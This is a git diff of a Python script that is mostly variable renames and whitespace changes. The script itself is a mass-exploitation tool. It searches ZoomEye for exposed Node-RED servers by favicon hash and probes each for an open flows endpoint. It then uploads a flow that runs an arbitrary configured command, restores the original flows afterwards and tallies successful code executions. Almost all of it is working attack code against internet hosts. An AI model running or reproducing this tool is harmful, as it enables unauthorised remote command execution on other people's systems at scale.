@@ -6,23 +6,22 @@ import string
 import time
 
 command_to_run = "touch im-in-your-walls"  # Replace with your desired command
-zoomeye_api_key = "YOUR-API-KEY"  # Replace with your zoomeye.org API key
-zoomeye_page_count = 5  # Multiply this number by 50 to get your total target list (maximum 200 pages before hitting monthly API limit)
+zoomEyeAPIkey = "YOUR-API-KEY" # Replace with your zoomeye.org API key
+zoomEye_page_count = 5 # Multiply this number by 50 to get your total target list (maximum 200 pages before hitting monthly API limit)
 
-zoomeye = ZoomEye(api_key=zoomeye_api_key)
+zm = ZoomEye(api_key=zoomEyeAPIkey)
 path = 'library/local/flows'
 ip_count = 0
-vulnerable_ip_count = 0
-code_exec_count = 0
+vulnerableIPCount = 0
+codeExecCount = 0
 
-# Icon hash searches for the default node-red favicon.ico, pairing it with up to date results using 'after' returns targets that are most likely to be open and vulnerable
-# data = zoomeye.multi_page_search('after:"2023-05-05" +iconhash: "818dd6afd0d0f9433b21774f89665eea"', page=zoomeye_page_count, facets=None)
-data = zoomeye.multi_page_search('iconhash: "818dd6afd0d0f9433b21774f89665eea"', page=zoomeye_page_count, facets=None)
+# Icon hash searches for the default node-red favicon.ico, pairing it with up to date results using 'after' returns targets that are most likely to be open and vulnerable 
+# data = zm.multi_page_search('after:"2023-05-05" +iconhash: "818dd6afd0d0f9433b21774f89665eea"', page=zoomEye_page_count, facets=None)
+data = zm.multi_page_search('iconhash: "818dd6afd0d0f9433b21774f89665eea"', page=zoomEye_page_count, facets=None)
 
-
-def check_url_for_vulnerability(ip, port, path):
+def check_url_for_vuln(ip, port, path):
     url = f"http://{ip}:{port}/{path}"
-
+    
     try:
         response = requests.get(url)
         response_code = response.status_code
@@ -33,9 +32,8 @@ def check_url_for_vulnerability(ip, port, path):
         else:
             return 0
     except requests.exceptions.RequestException as e:
-        # print("An error occurred:", e) BBBAU2S5
+        #print("An error occurred:", e) BBBAU2S5
         return 0
-
 
 def get_existing_flows(ip, port):
     url = f"http://{ip}:{port}/flows"
@@ -47,7 +45,6 @@ def get_existing_flows(ip, port):
         print(f"Failed to retrieve existing flows. Status code: {response.status_code}")
         return None
 
-
 def upload_flow(ip, port, flow):
     url = f"http://{ip}:{port}/flows"
     headers = {'Content-Type': 'application/json'}
@@ -58,11 +55,9 @@ def upload_flow(ip, port, flow):
         print(f"Failed to upload flow. Status code: {response.status_code}")
         print(response.text)
 
-
 def generate_random_name(length):
     letters_and_digits = string.ascii_letters + string.digits
     return ''.join(random.choice(letters_and_digits) for _ in range(length))
-
 
 def backup_flows(ip, port):
     url = f"http://{ip}:{port}/flows"
@@ -74,7 +69,6 @@ def backup_flows(ip, port):
         print(f"Failed to backup flows. Status code: {response.status_code}")
         return None
 
-
 def restore_flows(ip, port, flows):
     url = f"http://{ip}:{port}/flows"
     headers = {'Content-Type': 'application/json'}
@@ -85,16 +79,15 @@ def restore_flows(ip, port, flows):
         print(f"Failed to restore flows. Status code: {response.status_code}")
         print(response.text)
 
-
 for item in data:
     ip_count += 1
     ip = item['ip']
     port = item['portinfo']['port']
-    # print(f"{ip}:{port}")
-    # vulnerable_ip_count += navigate_to_url(ip, port, path)
-    if check_url_for_vulnerability(ip, port, path):
+    #print(f"{ip}:{port}")
+    #vulnerableIPCount += navigate_to_url(ip, port,path)
+    if check_url_for_vuln(ip, port,path):
         print(f"Executing command on: {ip}:{port}")
-        vulnerable_ip_count += 1
+        vulnerableIPCount += 1
         # Read the flows JSON from the file
         with open('flows.json', 'r') as file:
             flows_data = json.load(file)
@@ -139,5 +132,5 @@ for item in data:
             print("Failed to restore flows. Backup not available.")
 
 print("Number of IPs scanned:", ip_count)
-print("Number of vulnerable sessions:", vulnerable_ip_count)
-print("Number of successful code executions:", code_exec_count)
+print("Number of vulnerable sessions:", vulnerableIPCount)
+print("Number of sucessful code executions:", codeExecCount)
